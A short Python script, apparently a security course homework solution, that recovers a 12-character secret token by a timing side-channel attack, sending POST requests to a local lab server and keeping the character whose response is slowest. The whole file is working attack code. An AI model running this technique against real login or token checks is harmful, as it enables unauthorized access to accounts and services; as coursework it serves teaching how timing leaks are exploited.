from bs4 import BeautifulSoup

import requests
from requests.exceptions import HTTPError
import time

charSet = "0123456789abcdefghijklmnopqrstuvwxyz" # For tokens that contain uppercase chars, use this: "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ"
url = "http://0.0.0.0:8080/hw6/ex1"
max = 0.5
token = "000000000000"
for i in range(12):
    char = token[0]
    for c in charSet:
        token = token[:i] + c + token[i + 1:]
        start = time.time()
        response = requests.post(url, json={"email": "nico@epfl.ch", "token": token}) # b4351d395d2
        end = time.time()
        # print(end - start)
        if (end - start > max):
            print('\t', end - start, c)
            char = c
            oldMax = max
            max = end-start
            # The idea is to stop after I see a difference of 0.7 seconds between the current and maxPrevious execution time
            # 0.7s is the cost to check one char
            if (max > 0.7 + oldMax):
                print("Found ", char, "max = ", end-start)
                break

    token = token[:i] + char + token[i + 1:]
    print("Current token = " + token)

soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
print(response)
